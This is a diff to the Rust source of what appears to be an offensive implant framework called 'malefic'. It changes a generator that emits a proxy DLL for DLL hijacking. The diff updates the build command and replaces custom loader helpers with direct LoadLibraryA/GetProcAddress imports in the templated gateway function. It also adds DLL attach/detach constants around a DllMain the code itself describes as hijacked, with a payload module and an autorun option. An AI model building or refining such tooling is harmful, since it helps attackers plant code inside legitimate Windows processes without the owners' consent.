@@ -85,7 +85,7 @@ pub fn update_proxydll(
     log_info!("  malefic-autorun: {}", use_prelude);
 
     log_step!("Next Steps:");
-    log_info!("  Build: cargo build --release -p malefic-proxydll");
+    log_info!("  Build: ./target/release/malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu");
     log_info!("  (Features are pre-configured in Cargo.toml)");
 
     Ok(())
@@ -133,8 +133,17 @@ fn build_lib(
 mod payload;
 
 use lazy_static::lazy_static;
+use std::ffi::CString;
 use std::sync::{{Arc, Mutex}};
-use malefic_os_win::kit::apis::{{m_load_library_a, m_get_func_addr_with_module_base}};
+
+#[link(name = "kernel32")]
+extern "system" {{
+    fn LoadLibraryA(lp_lib_file_name: *const u8) -> *mut core::ffi::c_void;
+    fn GetProcAddress(
+        h_module: *mut core::ffi::c_void,
+        lp_proc_name: *const u8,
+    ) -> *mut core::ffi::c_void;
+}}
 
 const DLL_NAME: &str = r"{}";
 static mut ADDRESS: usize = 0;
@@ -185,20 +194,20 @@ pub fn gateway(
         return 0;
     }}
 
-    // Convert DLL name to null-terminated C string
-    let dll_name_cstr = format!("{{}}\\0", DLL_NAME);
-    let dll_address = unsafe {{ m_load_library_a(dll_name_cstr.as_ptr()) }};
+    let dll_name_cstr = match CString::new(DLL_NAME) {{
+        Ok(value) => value,
+        Err(_) => return 0,
+    }};
+    let dll_address = unsafe {{ LoadLibraryA(dll_name_cstr.as_ptr() as *const u8) }};
     if dll_address.is_null() {{
         return 0;
     }}
 
-    // Get function address using module base
-    let func_address = unsafe {{
-        m_get_func_addr_with_module_base(
-            dll_address as *const core::ffi::c_void,
-            func_name.as_bytes()
-        )
+    let func_name_cstr = match CString::new(func_name) {{
+        Ok(value) => value,
+        Err(_) => return 0,
     }};
+    let func_address = unsafe {{ GetProcAddress(dll_address, func_name_cstr.as_ptr() as *const u8) }};
 
     if func_address.is_null() {{
         return 0;
@@ -223,6 +232,12 @@ pub fn gateway(
 
 
 use windows::Win32::Foundation::HINSTANCE;
+
+const DLL_PROCESS_DETACH: u32 = 0;
+const DLL_PROCESS_ATTACH: u32 = 1;
+const DLL_THREAD_ATTACH: u32 = 2;
+const DLL_THREAD_DETACH: u32 = 3;
+
 // Will hijack dll_main
 #[no_mangle]
 #[allow(non_snake_case)]
